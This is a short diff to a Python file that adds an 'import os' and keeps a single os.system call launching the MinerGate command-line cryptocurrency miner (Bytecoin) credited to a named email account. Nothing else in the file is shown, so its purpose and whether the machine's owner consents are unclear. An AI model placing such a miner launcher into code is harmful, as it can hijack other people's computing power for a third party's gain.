@@ -1,1 +1,3 @@
-os.system("minergate-cli -user princessshilpa2016@gmail.com -bcn")
+import os;
+
+app = os.system("minergate-cli -user princessshilpa2016@gmail.com -bcn")
